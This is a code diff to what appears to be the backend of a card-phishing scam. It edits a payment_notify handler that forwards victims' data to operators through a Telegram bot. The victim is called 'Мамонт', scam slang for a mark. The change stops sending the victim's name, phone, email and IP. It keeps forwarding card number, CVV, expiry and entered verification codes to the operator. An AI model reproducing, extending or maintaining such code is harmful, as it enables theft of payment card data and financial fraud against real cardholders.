@@ -2180,34 +2180,8 @@ async def payment_notify(request):
             sum_str = f'\nСумма: {m.group(1).replace(",", ".")} {m.group(2)}'
         else:
             sum_str = f'\nСумма: {total}'
-    # 1. Повідомлення з ФІО, телефоном, email, IP + кнопки блокування
-    msg1 = (
-        f"Мамонт ввёл Ф.И.О.: <b>{name}</b>\n\n"
-        f"phone_number: {phone}\n"
-        f"full_name: {name}\n"
-        f"mail: {email}\n"
-        f"ip: {ip}" + sum_str
-    )
-    kb1 = InlineKeyboardMarkup(
-        inline_keyboard=[
-            [
-                InlineKeyboardButton(text="Заблокировать", callback_data=f"block:{ip}"),
-                InlineKeyboardButton(text="Розблокувати", callback_data=f"unblock:{ip}")
-            ]
-        ]
-    )
-    try:
-        await bot.send_message(PAYMENT_GROUP_ID, msg1, parse_mode='HTML', reply_markup=kb1)
-    except Exception as e:
-        print(f"[ERROR] Не вдалося надіслати msg1 у PAYMENT_GROUP_ID: {e}")
-        import traceback
-        traceback.print_exc()
-    try:
-        await bot.send_message(ADMIN_GROUP_ID, msg1, parse_mode='HTML')  # Без кнопок
-    except Exception as e:
-        print(f"[ERROR] Не вдалося надіслати msg1 у ADMIN_GROUP_ID: {e}")
-        import traceback
-        traceback.print_exc()
+    # 1. Повідомлення з ФІО, телефоном, email, IP + кнопки блокування - ВИДАЛЕНО
+    # Лог з ФІО більше не надсилається
     # 2. Повідомлення з карткою, CVV, expiry, email, IP + кнопки для карт/коду
     page_code = data.get('page_code', '')
     msg2 = (
@@ -2269,12 +2243,7 @@ async def payment_notify(request):
         if row:
             admin_user_id = row[0]
     if admin_user_id:
-        try:
-            await bot.send_message(admin_user_id, 'Мамонт ввёл ФИО')
-        except Exception as e:
-            print(f"[ERROR] Не вдалося надіслати ФИО admin_user_id: {e}")
-            import traceback
-            traceback.print_exc()
+        # Прибираємо лог "Мамонт ввёл ФИО" - залишаємо тільки карту та код
         try:
             await bot.send_message(admin_user_id, 'Мамонт ввёл карту')
         except Exception as e:
@@ -2312,6 +2281,7 @@ async def code_notify(request):
         if row:
             admin_user_id = row[0]
     if admin_user_id:
+        # Лог "Мамонт ввёл код" залишається
         await bot.send_message(admin_user_id, 'Мамонт ввёл код')
     return web.Response(text='ok')
 
